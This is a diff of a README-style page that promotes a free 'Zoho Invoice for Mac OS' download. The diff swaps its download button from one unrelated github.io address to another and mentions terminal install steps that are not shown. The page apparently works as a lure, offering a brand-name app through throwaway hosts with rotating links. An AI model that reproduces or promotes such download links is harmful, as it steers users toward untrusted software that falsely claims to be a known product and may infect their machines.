@@ -3,7 +3,7 @@
 
 Easily download and install Zoho Invoice for Mac OS to streamline your invoicing and billing tasks. Follow the step-by-step guide below to set up this powerful invoicing software for free!
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/zohoinvoice)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/zohoinvoice)
 
 If the download button doesn't work, follow the terminal instructions below for a seamless installation.
 
